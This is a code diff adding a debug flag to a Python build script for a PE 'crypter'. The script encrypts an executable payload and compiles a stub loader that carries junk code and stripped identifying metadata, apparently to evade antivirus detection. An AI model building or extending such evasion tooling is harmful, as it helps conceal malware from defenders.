@@ -107,6 +107,7 @@ def build_stub(
     output_exe: Path,
     arch: str = "x64",
     junk_code: str = "",
+    debug: bool = False,
 ) -> Path:
     """Compile the stub loader with the encrypted payload."""
 
@@ -129,6 +130,7 @@ def build_stub(
         "-fno-asynchronous-unwind-tables", "-fno-ident",
         "-fdata-sections", "-ffunction-sections",
         "-DWIN32_LEAN_AND_MEAN",
+        *((["-DSTUB_DEBUG"] if debug else [])),
         f"-include", str(junk_path),
         "-o", str(output_exe),
         str(stub_src),
@@ -155,6 +157,7 @@ def crypt_pe(
     stub_dir: Path,
     arch: str = "x64",
     key_size: int = 32,
+    debug: bool = False,
 ) -> Path:
     """
     Full crypter pipeline:
@@ -196,7 +199,7 @@ def crypt_pe(
             raise FileNotFoundError(f"Stub source not found: {stub_src}")
 
         # Compile
-        build_stub(stub_src, header_path, output_exe, arch, junk)
+        build_stub(stub_src, header_path, output_exe, arch, junk, debug=debug)
 
         print(f"[+] Crypter: {pe_size} bytes payload → "
               f"{output_exe.stat().st_size} bytes stub "
